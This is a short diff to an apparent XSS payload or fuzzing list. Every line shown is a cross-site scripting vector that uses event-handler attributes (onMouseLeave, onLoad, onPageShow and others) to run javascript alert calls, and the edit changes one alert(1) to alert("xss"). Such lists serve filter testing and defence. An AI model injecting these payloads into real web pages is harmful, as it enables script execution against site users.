@@ -172,7 +172,7 @@
 &lt;bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"&gt;&lt;/bgsound onPropertyChange&gt;
 &lt;html onMouseLeave html onMouseLeave="javascript:javascript:alert(1)"&gt;&lt;/html onMouseLeave&gt;
 &lt;html onMouseWheel html onMouseWheel="javascript:javascript:alert(1)"&gt;&lt;/html onMouseWheel&gt;
-&lt;style onLoad style onLoad="javascript:javascript:alert(1)"&gt;&lt;/style onLoad&gt;
+&lt;style onLoad style onLoad="javascript:javascript:alert("xss")"&gt;&lt;/style onLoad&gt;
 &lt;iframe onReadyStateChange iframe onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/iframe onReadyStateChange&gt;
 &lt;body onPageShow body onPageShow="javascript:javascript:alert(1)"&gt;&lt;/body onPageShow&gt;
 &lt;style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"&gt;&lt;/style onReadyStateChange&gt;
